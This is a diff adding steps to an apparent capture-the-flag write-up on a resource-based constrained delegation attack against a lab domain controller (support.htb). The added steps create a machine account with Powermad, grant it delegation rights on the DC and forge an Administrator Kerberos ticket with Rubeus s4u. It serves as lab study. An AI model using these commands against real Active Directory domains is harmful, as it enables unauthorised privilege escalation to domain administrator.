@@ -138,7 +138,41 @@ that with `Get-ADDomain`
 
 We already determined we satisfy number 3 in our inital enumeration so we can start performing the attack
 
-First we need to add a new machine account to the target with [Powermad](https://github.com/Kevin-Robertson/Powermad/tree/master)
+First we need to add a new machine account to the target with [Powermad](https://github.com/Kevin-Robertson/Powermad/tree/master) and get the SID of the created machine account
+
+`New-MachineAccount -MachineAccount owned -Password $(ConvertTo-SecureString Password -AsPlainText -Force)`
+
+`Get-ADComputer -identity owned`
+
+![owned$ SID](./pictures/machine-account.png)
+
+Next we need to set `PrincipalsAllowedToDelagateToAccount` to our machine account on the DC, this will 
+configure the `msds-allowedtoactonbehalfofotheridentity` attribute for us (We could also use PowerView to 
+set the attribute directly)
+
+`Set-ADComputer -Identity DC -PrinicpalsAllowedToDelegateToAccount owned$`
+
+![Sanity Check](./pictures/owned-check.png)
+
+We can also check the value of `msds-allowedtoactonbehalfofidentity`
+
+`Get-ADComputer DC -properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity`
+
+![check](./pictures/owned-allowed.png)
+
+Now we need to use the s4u Rubeus module to generate a Kerberos ticket on behalf of the Administrator account
+
+First we need the hash of the machine account's password
+
+`Rubeus.exe hash /password:Password /user:owned$ /domain:support.htb`
+
+![password hash](./pictures/rubeus-hash.png)
+
+Now we can use s4u to create a Kerberos ticket for the Administrator account
+
+`Rubeus.exe s4u /user:owned$ /rc4:A4F49C406510BDCAB6824EE7C30FD852 /impersonateuser:Administrator /msdsspn`
+
+
 
 ### Lessons Learned
 
@@ -150,4 +184,5 @@ First we need to add a new machine account to the target with [Powermad](https:/
     - code execution as a domain user that belongs to the Authenticated Users Group  
     - `ms-ds-machineaccountquota` attribute to be > 0 (Use `Get-ADObject`)  
     - current user needs `WRITE` privileges (`GenericAll/WriteDACL`) over a domain joined machine  
+- When using Rubeus s4u, try cifs as the service for /msdsspn if PowerView's `Get-DomainUser username samaccountname,msds-allowedtodelegateto` returns nothing
 
